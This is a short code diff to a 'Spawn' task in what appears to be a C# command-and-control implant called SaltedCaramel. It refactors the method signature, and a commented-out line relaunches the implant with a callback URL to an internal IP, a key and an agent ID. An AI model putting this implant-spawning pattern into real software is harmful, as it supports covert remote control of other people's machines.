@@ -1,11 +1,12 @@
 ﻿using System;
 using System.Reflection;
+using SaltedCaramel.Jobs;
 
 namespace SaltedCaramel.Tasks
 {
     class Spawn
     {
-        public static void Execute(SCTask task, SCImplant agent)
+        public static void Execute(Job job, SCImplant agent)
         {
             //typeof(SaltedCaramel).Assembly.EntryPoint.Invoke(null, 
             //    new[] { new string[] { "https://192.168.38.192", "CqxQlHyWOSWJprgBA6aiKPP94lCSn8+Ki+gpMVdLNgQ=", "3915d66f-e9a5-4912-8442-910e0cee74df" } });
